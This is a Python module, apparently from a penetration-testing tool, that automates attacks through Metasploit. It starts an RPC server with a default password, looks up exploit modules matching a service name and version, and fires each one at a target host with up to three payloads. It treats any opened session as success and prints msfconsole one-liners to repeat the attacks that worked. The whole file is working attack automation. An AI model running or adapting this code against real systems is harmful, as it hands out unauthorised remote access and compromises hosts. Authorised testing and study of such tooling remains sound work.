import json
import pty
import re
import socket
import subprocess
import time
from typing import List, Dict

from pymetasploit3.msfrpc import MsfRpcClient

from config import MSF_INDEX_FILE
from utils.logger import Logger
from constants import ExploitManagerConstants


class ExploitManager:
    """
    Class for testing and executing exploits using Metasploit Framework.
    """

    def __init__(self, host='127.0.0.1', password='msf', port=55552):
        self.logger = Logger(__name__).get_logger()
        self.client = self._start_msf(host, password, port)
        with open(MSF_INDEX_FILE, 'r') as f:
            self.msf_index = json.load(f)
        self.max_try_payloads = 3

    def _start_msf(self, host, password, port) -> MsfRpcClient:
        """
        Starts the Metasploit Framework RPC server.

        Args:
            host (str): The hostname or IP address where the MSF RPC server will bind to.
            password (str): The password to connect to the MSF RPC server.
            port (int): The port number where the MSF RPC server will bind to.

        Returns:
            MsfRpcClient: An instance of the MsfRpcClient, which is connected to the started MSF RPC server.

        Raises:
            TimeoutError: If failed to start MSF and establish a connection within the timeout period.
        """
        self.logger.info(ExploitManagerConstants.START_MSF)
        master, slave = pty.openpty()
        subprocess.Popen(
            ['msfconsole', '-qx', f'load msgrpc ServerHost={host} Pass={password}'],
            stdin=slave, stdout=slave, stderr=slave, universal_newlines=True
        )
        if self._wait_msf_ready(host, port):
            self.logger.info(ExploitManagerConstants.MSF_SUCCESSFUL)
            return MsfRpcClient(password, port=port)
        else:
            self.logger.error(ExploitManagerConstants.MSF_ERROR)
            raise TimeoutError(ExploitManagerConstants.MSF_ERROR)

    def _wait_msf_ready(self, host: str, port: int, timeout=30) -> bool:
        """
        Waits until the MSF RPC server is ready.

        Args:
            host (str): The host address of the MSF RPC server.
            port (int): Port number of MSF RPC server.
            timeout (int): Maximum time to wait for MSF RPC server to be ready.

        Returns:
            bool: True if the MSF RPC server is ready, False if timed out.
        """
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.create_connection((host, port), timeout=2):
                    self.logger.info(f"MSF started in {time.time() - start_time} seconds")
                    return True
            except (socket.timeout, ConnectionRefusedError):
                time.sleep(1)  # Wait for a second before trying again
        self.logger.error(ExploitManagerConstants.MSF_TIMEDOUT)
        return False

    def find_exploit_modules(self, service: str, version: str) -> List[str]:
        """
        Searches and returns exploit modules that match the provided service and version.

        Args:
            service (str): The name of the service.
            version (str): The version of the service.

        Returns:
            list: List of matching exploit module paths.
        """
        self.logger.info(f"Searching for exploits of {service} with version {version}")
        service_pattern = re.compile(re.escape(service), re.IGNORECASE)
        version_pattern = re.compile(re.escape(str(version)), re.IGNORECASE)

        matching_modules = set()
        for module in self.msf_index:
            if service_pattern.search(module['name']) or service_pattern.search(module['description']):
                if version_pattern.search(module['name']) or version_pattern.search(module['description']):
                    matching_modules.add(module['path'])

        return list(matching_modules)

    def apply_exploits(self, exploits: List, target: Dict) -> List[str]:
        """
        Applies a list of exploit modules against a target.

        Args:
            exploits (list): List of exploit module names to be applied.
            target (dict): Target information, including host and port.

        Returns:
            list: List of successful exploit names.
        """
        success_exploits = []
        for exploit_name in exploits:
            self.logger.info(f"Trying exploit {exploit_name}")
            exploit = self.client.modules.use('exploit', exploit_name)
            if 'RHOSTS' in exploit.options:
                exploit['RHOSTS'] = target['host']
            elif 'RHOST' in exploit.options:
                exploit['RHOST'] = target['host']
            else:
                # for simplicity, try only exploits with defined host/port
                continue

            if 'RPORT' in exploit.options:
                exploit['RPORT'] = target['port']

            for payload in self.client.call('module.compatible_payloads', [exploit_name])['payloads'][
                           :self.max_try_payloads]:
                self.logger.info(f"Trying payload {payload}")
                exploit.execute(payload=payload)
                if self._wait_for_success():
                    success_exploits.append(exploit_name)
                    break
        return success_exploits

    def _wait_for_success(self, retries: int = 3, delay: int = 5) -> bool:
        """
        Waits for an exploit to succeed.

        Args:
            retries (int): Number of times to check for successful exploitation.
            delay (int): Delay between each check in seconds.

        Returns:
            bool: True if successful, False otherwise.
        """
        for _ in range(retries):
            time.sleep(delay)
            if self.client.sessions.list:
                return True
        return False

    def exploit_target(self, target: Dict, product: str, version: str) -> List[str]:
        """
        Finds suitable exploit modules and applies them to a target.

        Args:
            target (dict): Target information, including host and port.
            product (str): Name of the product.
            version (str): Version of the product.

        Returns:
            list: List of response strings for successful exploits.
        """
        exploits = self.find_exploit_modules(product, version)
        successful_exploits = self.apply_exploits(exploits, target)
        return self._prepare_responses(target, successful_exploits)

    @staticmethod
    def _prepare_responses(target: Dict, successful_exploits: List[str]) -> List[str]:
        """
        Prepares response strings for successful exploits.

        Args:
            target (dict): Target information, including host and port.
            successful_exploits (list): List of successful exploit names.

        Returns:
            list: List of response strings for successful exploits.
        """
        responses = []
        for exploit in successful_exploits:
            msf_one_liner = (
                f'msfconsole -q -x "use {exploit}; set RHOSTS {target["host"]}; '
                f'set RPORT {target["port"]}; run"'
            )
            response = f'Exploit {exploit} succeeded against {target["host"]}:{target["port"]}. ' \
                       f'MSF one-liner: {msf_one_liner}'
            responses.append(response)
        return responses
